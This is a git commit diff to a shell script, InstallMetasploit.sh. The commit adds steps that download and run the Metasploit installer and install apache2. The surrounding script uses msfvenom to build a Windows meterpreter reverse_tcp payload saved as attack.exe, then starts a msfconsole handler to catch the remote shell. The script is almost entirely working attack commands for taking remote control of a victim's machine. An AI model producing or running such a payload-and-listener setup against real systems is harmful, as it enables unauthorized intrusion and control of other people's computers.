02712cb876198e445cd1b8dfd47f530e605aede6
Cr4zyD14m0nd <100342218+Cr4zyD14m0nd@users.noreply.github.com>
2022-04-05 10:27:19 -0500

    Update InstallMetasploit.sh

--- InstallMetasploit.sh
+++ InstallMetasploit.sh
@@ -8,11 +8,12 @@ echo "#                                #"
 echo "##################################"
 echo ""
 
-
+apt-get install ifconfig
 ifconfig
 echo "Please enter your IP"
 read IP
-
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+apt-get install apache2
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=$IP LPORT=4444 -o attack.exe
 msfconsole -q -x " use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT 4444; exploit;"
 
